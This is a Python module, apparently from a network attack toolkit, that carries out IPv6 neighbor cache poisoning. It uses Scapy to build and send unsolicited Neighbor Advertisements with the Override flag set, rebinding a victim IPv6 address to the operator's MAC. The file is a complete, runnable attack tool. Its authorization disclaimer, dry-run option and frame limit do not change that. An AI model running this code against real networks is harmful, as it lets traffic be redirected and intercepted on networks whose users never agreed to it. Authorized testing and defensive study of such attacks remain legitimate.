"""NDP cache poisoning: send unsolicited Neighbor Advertisements that rebind a target's address to the attacker.

IPv6 hosts keep a neighbor cache that maps each address to a link-layer address (RFC 4861). A Neighbor
Advertisement can update an existing entry, and nothing authenticates it on a plain Ethernet segment.
An unsolicited NA with the Override flag set tells the receiver to replace the stored link-layer address
for the target, even when the stored one is still valid.

This module sends unsolicited NAs for a target address you choose, with the Target Link-Layer Address
option set to the operator's MAC, from the operator's MAC, to the all-nodes multicast address with hop
limit 255. The effect to measure is whether a host that already knows the target replaces the stored
MAC with the operator's.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.inet6 import (
    ICMPv6ND_NA,
    ICMPv6NDOptDstLLAddr,
    IPv6,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.rogue_router_advertisement import (
    ALL_NODES_IP,
    ALL_NODES_MAC,
    link_local_from_mac,
)

MAX_FRAMES = 100


def validate_target(address: str) -> ipaddress.IPv6Address:
    try:
        parsed = ipaddress.IPv6Address(address)
    except ValueError as exc:
        raise ValueError(f"Target {address!r} is not an IPv6 address.") from exc
    if parsed.is_multicast or parsed.is_unspecified:
        raise ValueError("Target must be a unicast IPv6 address.")
    return parsed


@dataclass(frozen=True)
class NdpCachePoisoningConfig:
    iface: str                          # attacker interface, on the segment with the victims
    source_mac: str                     # the MAC the poisoned entries will point to (required)
    target: str = ""                    # the IPv6 address whose neighbor entry is rebound (required)
    frames: int = 3                     # NAs sent, to keep the new binding in place
    dry_run: bool = False               # build NAs but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        if not self.target:
            raise ValueError("Target IPv6 address is required.")
        validate_target(self.target)
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class NdpCachePoisoningStats:
    frames: int = 0
    status: str = ""


def build_advertisement(config: NdpCachePoisoningConfig) -> Packet:
    """One unsolicited NA: target address, Override set, Target Link-Layer Address = the operator's MAC."""
    source = normalize_unicast_mac(config.source_mac)
    target = validate_target(config.target)
    return (
        Ether(src=source, dst=ALL_NODES_MAC)
        / IPv6(src=link_local_from_mac(source), dst=ALL_NODES_IP, hlim=255)
        / ICMPv6ND_NA(tgt=str(target), R=0, S=0, O=1)
        / ICMPv6NDOptDstLLAddr(lladdr=source)
    )


def run_ndp_cache_poisoning(
    config: NdpCachePoisoningConfig,
    stop_event: threading.Event,
    on_progress: Callable[[NdpCachePoisoningStats], None],
    send: Callable[..., Any] | None = None,
) -> NdpCachePoisoningStats:
    """Send `frames` unsolicited Neighbor Advertisements, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = NdpCachePoisoningStats(
            status=(
                f"Dry run: would send {config.frames} unsolicited Neighbor Advertisement(s) binding {config.target} "
                f"to {config.source_mac}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = NdpCachePoisoningStats()
    frame = build_advertisement(config)
    for _ in range(config.frames):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.frames} advertisement(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
    return stats
